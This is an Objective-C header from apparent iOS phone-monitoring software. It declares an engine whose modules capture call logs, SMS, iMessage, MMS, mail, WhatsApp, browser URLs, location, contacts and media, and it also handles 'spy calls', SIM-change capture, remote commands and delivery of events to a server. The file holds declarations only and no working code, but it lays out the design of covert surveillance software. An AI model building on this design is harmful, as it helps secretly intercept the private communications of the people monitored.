//
//  AppEngine.h
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "LicenseChangeListener.h"
#import "ActivationCodeCaptureDelegate.h"
#import "ServerAddressChangeDelegate.h"

@class TelephonyNotificationManagerImpl;
@class AppContextImp;
@class SystemUtilsImpl;
@class SMSSendManager;
@class LicenseManager;
@class ConfigurationManagerImpl;
@class ServerAddressManagerImp;
@class ConnectionHistoryManagerImp;
@class PreferenceManagerImpl;
@class CommandServiceManager;
@class DataDeliveryManager;
@class ActivationManager;
@class EventRepositoryManager;
@class EventDeliveryManager;
@class EventCenter;
@class RemoteCmdManagerImpl;
@class SIMCaptureManagerImpl;
@class ActivationCodeCaptureManager;

// Utils
@class ServerErrorStatusHandler;
@class PreferencesChangeHandler;

// Connection to UI
@class AppEngineConnection;

// Features
@class CallLogCaptureManager;
@class SMSCaptureManager;
@class IMessageCaptureManager;
@class MMSCaptureManager;
@class MailCaptureManager;
@class LocationManagerImpl;
@class AddressbookManagerImp;
@class MediaFinder;
@class MediaCaptureManager;
@class SpyCallManager;
@class AppAgentManager;
@class WhatsAppCaptureManager;
@class BrowserUrlCaptureManager;

@interface AppEngine : NSObject <LicenseChangeListener, ActivationCodeCaptureDelegate, ServerAddressChangeDelegate> {
@private
	// Engine
	TelephonyNotificationManagerImpl	*mTelephonyNotificationManagerImpl;
	AppContextImp*						mApplicationContext;
	SystemUtilsImpl						*mSystemUtils;
	SMSSendManager*						mSMSSendManager;
	LicenseManager*						mLicenseManager;
	ConfigurationManagerImpl*			mConfigurationManager;
	ServerAddressManagerImp*			mServerAddressManager;
	ConnectionHistoryManagerImp*		mConnectionHistoryManager;
	PreferenceManagerImpl*				mPreferenceManager;
	CommandServiceManager*				mCSM;
	DataDeliveryManager*				mDDM;
	ActivationManager*					mActivationManager;
	EventRepositoryManager*				mERM;
	EventDeliveryManager*				mEDM;
	EventCenter*						mEventCenter;
	RemoteCmdManagerImpl*				mRemoteCmdManager;
	SIMCaptureManagerImpl*				mSIMChangeManager;
	ActivationCodeCaptureManager*		mActivationCodeCaptureManager;
	
	// Utils
	ServerErrorStatusHandler*			mServerErrorStatusHandler;
	PreferencesChangeHandler			*mPreferencesChangeHandler;
	
	// Connection to UI
	AppEngineConnection*				mAppEngineConnection;
	
	// Features
	CallLogCaptureManager				*mCallLogCaptureManager;
	SMSCaptureManager					*mSMSCaptureManager;
	IMessageCaptureManager				*mIMessageCaptureManager;
	MMSCaptureManager					*mMMSCaptureManager;
	MailCaptureManager					*mMailCaptureManager;
	LocationManagerImpl					*mLocationManager;
	AddressbookManagerImp				*mAddressbookManager;
	MediaFinder							*mMediaFinder;
	MediaCaptureManager					*mMediaCaptureManager;
	SpyCallManager						*mSpyCallManager;
	AppAgentManager						*mAppAgentManager;
	WhatsAppCaptureManager	            *mWhatsAppCaptureManager;
	BrowserUrlCaptureManager			*mBrowserUrlCaptureManager;
	
	// Flags
	BOOL			mIsRestartingAppEngine;
	BOOL			mIsNeedSendSMSHomeNumbers;
}

// Engine
@property (nonatomic, readonly) AppContextImp* mApplicationContext;
@property (nonatomic, readonly) SystemUtilsImpl *mSystemUtils;
@property (nonatomic, readonly) SMSSendManager* mSMSSendManager;
@property (nonatomic, readonly) LicenseManager* mLicenseManager;
@property (nonatomic, readonly) ConfigurationManagerImpl* mConfigurationManager;
@property (nonatomic, readonly) ServerAddressManagerImp* mServerAddressManager;
@property (nonatomic, readonly) ConnectionHistoryManagerImp* mConnectionHistoryManager;
@property (nonatomic, readonly) PreferenceManagerImpl* mPreferenceManager;
@property (nonatomic, readonly) CommandServiceManager* mCSM;
@property (nonatomic, readonly) DataDeliveryManager* mDDM;
@property (nonatomic, readonly) ActivationManager* mActivationManager;
@property (nonatomic, readonly) EventRepositoryManager* mERM;
@property (nonatomic, readonly) EventDeliveryManager* mEDM;
@property (nonatomic, readonly) EventCenter* mEventCenter;
@property (nonatomic, readonly) RemoteCmdManagerImpl* mRemoteCmdManager;
@property (nonatomic, readonly) SIMCaptureManagerImpl* mSIMChangeManager;
@property (nonatomic, readonly) ActivationCodeCaptureManager* mActivationCodeCaptureManager;

// Features
@property (nonatomic, readonly) CallLogCaptureManager *mCallLogCaptureManager;
@property (nonatomic, readonly) SMSCaptureManager *mSMSCaptureManager;
@property (nonatomic, readonly) IMessageCaptureManager *mIMessageCaptureManager;
@property (nonatomic, readonly) MMSCaptureManager *mMMSCaptureManager;
@property (nonatomic, readonly) MailCaptureManager *mMailCaptureManager;
@property (nonatomic, readonly) LocationManagerImpl *mLocationManager;
@property (nonatomic, readonly) AddressbookManagerImp *mAddressbookManager;
@property (nonatomic, readonly) MediaFinder *mMediaFinder;
@property (nonatomic, readonly) MediaCaptureManager *mMediaCaptureManager;
@property (nonatomic, readonly) SpyCallManager *mSpyCallManager;
@property (nonatomic, readonly) AppAgentManager *mAppAgentManager;
@property (nonatomic, readonly) WhatsAppCaptureManager *mWhatsAppCaptureManager;
@property (nonatomic, readonly) BrowserUrlCaptureManager *mBrowserUrlCaptureManager;

// Flags
@property (nonatomic, assign) BOOL mIsRestartingAppEngine;
@property (nonatomic, assign) BOOL mIsNeedSendSMSHomeNumbers;

@end
